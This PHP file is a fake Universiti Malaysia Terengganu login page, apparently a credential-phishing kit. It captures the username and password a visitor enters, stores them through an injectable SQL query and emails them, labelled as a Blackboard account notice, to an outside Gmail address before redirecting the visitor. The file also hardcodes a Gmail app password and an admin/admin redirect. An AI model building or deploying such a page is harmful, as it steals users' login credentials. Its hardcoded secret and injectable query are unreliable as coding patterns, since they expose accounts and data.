<?php 
	require_once 'umt_connection.php';
  session_destroy();
?>
<?php

session_start();
//send email to user
	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\Exception;
	
	require '../vendor/autoload.php';

	define ("MYGMAIL", "voon.chuen@gmail.com");
	define ("MYAPPPASS", "hovyoeqwgduelezl");

	function sendEmail($newemail,$randPass){
		$mail = new PHPMailer();

		try{
			$mail->Host = "smtp.gmail.com";
			$mail->Port = 587;
			$mail->SMTPSecure = 'tls';
			$mail->isSMTP();
			$mail->SMTPAuth = true;
			
			//Your email
			$sender_email = MYGMAIL;
			$mail->Username = $sender_email;
			$mail->Password = MYAPPPASS;
			
			//Receipient's email
			$to = "garyhyw99@gmail.com";
			$mail->From = $sender_email;
			$mail->FromName = "Blackboard System";
			$mail->AddAddress($to);
			$mail->AddReplyTo($sender_email, "Administrator");
			
			$content = "<h2>Your new email is <mark>$newemail</mark></h2><br /><h2>Your new password is <mark>$randPass</mark></h2><br />";
			
			$mail->IsHTML(true);
			$mail->WordWrap = 50;
			$mail->Subject = "New Account for Blackboard";
			$mail->Body = $content;
			
			if($mail->Send()){
				echo "<script>alert('Email has been send.');</script>";
			}
		}
		catch(Exception $ex){
			echo "<script>alert('Email could not be sent.')</script>";
			echo "<p>Mailer Error: " . $mail->ErrorInfo . "</p>";
		}
	}
?>
<?php  
 if(isset($_POST["register"]))  
 {  
      if(empty($_POST["email"]) || empty($_POST["password"]))  
      {  
           echo '<script>alert("Both Fields are required")</script>';  
      }
      else if($_POST["email"] == "admin" && $_POST["password"] == "admin")
      {
        header("Location: admin.php");;
      }
      else  
      {  
        if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['email'],$_POST['password']))
        {
            $email = filter_var($_POST['email'],FILTER_SANITIZE_STRING);
            $password = filter_var($_POST['password'],FILTER_SANITIZE_STRING);
            $query = "INSERT INTO  account(email, password) VALUES('$email', '$password')";  
            
            if (mysqli_query($conn, $query)) {
                echo '<script>alert("Succesfully signed in")</script>';
                $_SESSION["email"] = $email;
                $_SESSION["password"]= $password;
                sendEmail($email,$password);
                header("Location: validate.php");
             } else {
                $_SESSION["email"] = $email;
                $_SESSION["password"]= $password;
                header("Location: validate.php");;
             }
         }  	
	   }
 }  
 
 ?>  
 <!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0">
        <title>Universiti Malaysia Terengganu Login Service</title>
        <link rel="stylesheet" type="text/css" href="test.css">
    </head>
    <body>
    <div class="wrapper">
      <div class="container">
        <header>
          <img src="LOGO.png" alt="Universiti Malaysia Terengganu">
        </header>

        <div class="content">
          <div class="column one">
            

            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">

                                                
                          <div class="form-element-wrapper">
                <label for="username">Username</label>
                <input class="form-element form-field" id="email" name="email" type="text"
                	value="">
              </div>

              <div class="form-element-wrapper">
                <label for="password">Password</label>
                <input class="form-element form-field" id="password" name="password" type="password" value="">
              </div>

                                          <div class="form-element-wrapper">
                <input type="checkbox" name="donotcache" value="1" id="donotcache">
                <label for="donotcache">Don't Remember Login</label>
               </div>
                            
            
              <div class="form-element-wrapper">
                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
                <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
              </div>

                          <div class="form-element-wrapper">
                <button class="form-element form-button" type="submit" name="register"
                    >Login</button>
              </div>
            
                        </form>

			
                                                
          </div>
          <div class="column two">
            <ul class="list list-help">
                              <li class="list-help-item"><a href="https://traffic.umt.edu.my/ssp/"><span class="item-marker">&rsaquo;</span> Forgot your password?</a></li>
                            <li class="list-help-item"><a href="mailto:wifi.support@umt.edu.my"><span class="item-marker">&rsaquo;</span> Need Help?</a></li>
            </ul>
          </div>
        </div>
      </div>

      <footer>
        <div class="container container-footer">
          <p class="footer-text">Copyright 2019 Universiti Malaysia Terengganu</p>
        </div>
      </footer>
    </div>
    
 	</body>
</html>

